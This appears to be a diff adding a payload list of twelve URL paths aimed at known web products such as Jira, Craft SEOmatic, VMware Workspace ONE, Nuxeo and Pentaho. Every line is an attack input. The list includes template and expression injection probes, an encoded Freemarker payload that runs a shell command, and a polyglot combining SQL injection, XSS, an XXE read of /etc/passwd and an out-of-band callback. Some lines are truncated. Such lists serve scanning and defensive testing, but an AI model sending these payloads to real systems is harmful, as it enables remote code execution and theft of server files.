@@ -1,0 +1,12 @@
+/secure/ContactAdministrators!default.jspa
+/actions/seomatic/meta-container/meta-link-container/?uri={{228*
+/actions/seomatic/meta-container/all-meta-containers?uri={{228*
+/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%68%6f%73%74%73%22%29%7d
+/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test
+/nuxeo/login.jsp/pwn${31333333330+7}.xhtml
+/pentaho/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{T(java.net.InetAddress).getByName(
+/page?name={{range.constructor(\
+/search?search_key={{1337*1338}}
+/search?search_key=%7B%7B1337*1338%7D%7D
+/?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%20%3F%3E%3C%21--%20%27or%201%3D1--%3E%3C%21--%20%22%3E%3C%25%3D71%2A71%25%3E%7B%7B71%2A71%7D%7D%20--%3E%3C%21DOCTYPE%0Atest%20%5B%20%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3CstockCheck%3E%3CproductId%3E%26x%3B%3C%2FproductId%3E%3CstoreId%3E1%3C%2FstoreId%3E%3C%21%5BCDATA%5B%3Cs%3E%3Csvg%2Fonload%3Dprompt%285%29%3B%3E%26url%3Dhttps%3A%2F%2F%7B%7Binteractsh-url%7D%7D%26b%3D%5D%5D%3E%3C%2FstockCheck%3E
+/%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%20%3F%3E%3C%21--%20%27or%201%3D1--%3E%3C%21--%20%22%3E%3C%25%3D71%2A71%25%3E%7B%7B71%2A71%7D%7D%20--%3E%3C%21DOCTYPE%0Atest%20%5B%20%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3CstockCheck%3E%3CproductId%3E%26x%3B%3C%2FproductId%3E%3CstoreId%3E1%3C%2FstoreId%3E%3C%21%5BCDATA%5B%3Cs%3E%3Csvg%2Fonload%3Dprompt%285%29%3B%3E%26url%3Dhttps%3A%2F%2F%7B%7Binteractsh-url%7D%7D%26b%3D%5D%5D%3E%3C%2FstockCheck%3E%0A
